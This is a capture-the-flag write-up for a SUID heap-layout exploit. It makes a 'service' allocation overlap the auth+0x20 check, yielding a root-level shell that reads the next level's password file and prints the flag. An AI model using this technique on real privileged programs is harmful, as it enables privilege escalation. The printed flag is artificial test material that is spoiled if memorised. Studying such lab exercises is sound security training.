# Level 8

Same recon as level0: SUID **level9**.

## Analysis

```c
char *auth = NULL, *service = NULL;

int main(void) {
    char buf[128];
    for (;;) {
        printf("%p, %p \n", auth, service);     // prints both pointers each loop
        if (!fgets(buf, 128, stdin)) return 0;
        if (memcmp(buf, "auth ", 5) == 0) {
            auth = malloc(4); auth[0] = '\0';
            if (strlen(buf + 5) < 0x1f) strcpy(auth, buf + 5);
        }
        if (memcmp(buf, "service", 6) == 0) service = strdup(buf + 7);
        if (memcmp(buf, "login", 5) == 0) {
            if (*(int *)(auth + 0x20) == 0) fwrite("Password:\n", 1, 10, stdout);
            else system("/bin/sh");             // win
        }
    }
}
```

A small REPL. `login` gives a shell when the 4 bytes at `auth + 0x20` are non-zero. `auth` itself is only a 4-byte chunk, so `auth + 0x20` lands well outside it. The idea is to make the `service` allocation cover that address with our own data.

> **Arranging the heap.** `malloc` places new blocks right after existing ones. `auth` is a small 16-byte block; `service` (from `strdup`) lands right after it, so a long enough `service` string stretches over the `auth + 0x20` spot. See [heap layout](../knowledge_base/heap_overflow.md#heap-layout).

The program prints `auth` and `service` every loop, so we can read the real addresses instead of guessing.

## Exploit

```
$ ./level8
(nil), (nil)
auth AAAA
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

From the printed addresses: `auth = 0x804a008`, `service = 0x804a018`. The check reads `auth + 0x20 = 0x804a028`, which is `0x804a028 - 0x804a018 = 16` bytes into service's data. So the service string needs at least 17 chars for byte 16 to be our (non-zero) data, not the terminator. 30 A's is comfortably enough.

(Overflowing `auth` directly does not work: its `strcpy` is gated by `strlen < 0x1f`, which stops at `0x804a027`, one byte short of `auth + 0x20`.)

Flag: `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
